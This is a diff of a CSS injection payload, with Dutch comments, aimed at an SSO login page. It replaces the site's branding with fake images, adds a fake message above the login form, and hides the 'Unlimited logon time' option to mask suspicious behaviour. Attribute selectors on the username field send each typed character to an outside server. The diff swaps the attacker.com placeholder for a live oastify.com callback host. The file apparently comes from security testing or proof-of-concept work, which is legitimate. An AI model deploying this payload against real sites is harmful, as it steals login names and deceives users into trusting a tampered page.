@@ -2,12 +2,12 @@
 /* Dit wordt geladen in de SSO loginpagina */
 
 /* 1. Verberg originele branding, toon nep-branding */
-.TitleBar {
-  background-image: url('https://attacker.com/fake-logo.gif') !important;
-}
-.TitleImage {
-  background-image: url('https://attacker.com/fake-brand.gif') !important;
-}
+/*.TitleBar {*/
+/*  background-image: url('https://attacker.com/fake-logo.gif') !important;*/
+/*}*/
+/*.TitleImage {*/
+/*  background-image: url('https://attacker.com/fake-brand.gif') !important;*/
+/*}*/
 
 /* 2. Voeg nep-bericht toe boven het loginformulier */
 .panel-heading::before {
@@ -26,9 +26,9 @@
 /* Elke letter getypt in username triggert een request */
 /* naar attacker's server (werkt op browsers die */
 /* input[value] live updaten in de DOM) */
-input#LogOnName[value^="a"] { background: url('https://attacker.com/exfil?u=a'); }
-input#LogOnName[value^="b"] { background: url('https://attacker.com/exfil?u=b'); }
-input#LogOnName[value^="c"] { background: url('https://attacker.com/exfil?u=c'); }
+input#LogOnName[value^="a"] { background: url('https://7u2cws3k3lnvhyz2gxgsabxquh08ozco.oastify.com/exfil?u=a'); }
+input#LogOnName[value^="b"] { background: url('https://7u2cws3k3lnvhyz2gxgsabxquh08ozco.oastify.com/exfil?u=b'); }
+input#LogOnName[value^="c"] { background: url('https://7u2cws3k3lnvhyz2gxgsabxquh08ozco.oastify.com/exfil?u=c'); }
 /* ... etc voor elk karakter ... */
 
 /* 4. Verberg "Unlimited logon time" om verdacht gedrag te maskeren */
